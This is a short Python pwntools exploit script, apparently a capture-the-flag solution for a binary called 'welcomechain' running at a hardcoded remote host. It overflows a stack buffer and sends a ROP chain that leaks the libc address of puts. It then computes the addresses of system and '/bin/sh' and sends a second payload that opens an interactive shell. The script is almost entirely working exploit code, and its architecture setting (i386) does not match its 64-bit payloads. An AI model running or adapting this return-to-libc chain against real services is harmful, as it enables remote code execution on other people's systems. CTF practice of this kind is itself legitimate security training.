from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./welcomechain"
HOST = "114.177.250.4"
PORT = 2226

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
main_addr = elf.symbols["main"]
plt_puts = elf.plt["puts"]
got_puts = elf.got["puts"]
got_setbuf = elf.got["setbuf"]

libc = ELF('./libc.so.6')
off_puts = libc.symbols["puts"]
off_system = libc.symbols["system"]
off_binsh = next(libc.search("/bin/sh"))
#
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

rdi_ret = 0x400853
ret = 0x400576
def exploit():
	bufsize = 0x20 + 8
	payload = "A"*bufsize
	payload += p64(rdi_ret)
	payload += p64(got_puts)
	payload += p64(plt_puts)
	payload += p64(main_addr)
	conn.sendlineafter(": ", payload)
	conn.recvline()	
	libc_puts = u64(conn.recvline()[:-1]+"\x00\x00")
	libc_base = libc_puts - off_puts
	libc_system = libc_base + off_system
	libc_binsh = libc_base + off_binsh
	print hex(libc_base)
	
	payload = "A"*bufsize
	payload += p64(ret)
	payload += p64(rdi_ret)
	payload += p64(libc_binsh)
	payload += p64(libc_system)
	conn.sendlineafter(": ", payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
